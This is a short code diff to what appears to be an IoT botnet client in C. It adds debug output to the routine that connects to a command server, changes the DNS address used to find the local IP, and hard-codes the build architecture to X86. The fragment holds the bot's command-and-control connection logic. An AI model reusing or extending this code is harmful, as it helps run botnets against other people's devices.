@@ -1794,6 +1794,7 @@ void processCmd(int argc, unsigned char *argv[])
 
 int initConnection()
 {
+	printf("=====Init Connection ... =====\n");
 	unsigned char server[512];
 	memset(server, 0, 512);
 	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; } //if the sock initialized then close that.
@@ -1810,8 +1811,16 @@ int initConnection()
 
 	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
 
-	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
+	printf("=====server: %s=====\n", server);
+	printf("=====port  : %d=====\n", port);
 
+	if(!connectTimeout(mainCommSock, server, port, 30)) 
+	{
+		printf("=====Init Connection Timeout\t=====\n");
+		return 1;
+	}
+
+	printf("=====Init Connection Done\t=====\n");
 	return 0;
 }
 
@@ -1823,7 +1832,7 @@ int getOurIP()
 	struct sockaddr_in serv;
 	memset(&serv, 0, sizeof(serv));
 	serv.sin_family = AF_INET;
-	serv.sin_addr.s_addr = inet_addr("8.8.8.8");
+	serv.sin_addr.s_addr = inet_addr("114.114.114.114");
 	serv.sin_port = htons(53);
 
 	int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
@@ -1865,6 +1874,10 @@ int getOurIP()
 
 char *getBuild()
 {
+#define YYY_TEST 1
+#if YYY_TEST 
+	return "X86";
+#else
 	#ifdef MIPS_BUILD
 	return "MIPS";
 	#elif MIPSEL_BUILD
@@ -1878,6 +1891,7 @@ char *getBuild()
 	#else
 	return "UNKNOWN";
 	#endif
+#endif
 }
 
 int main(int argc, unsigned char *argv[])
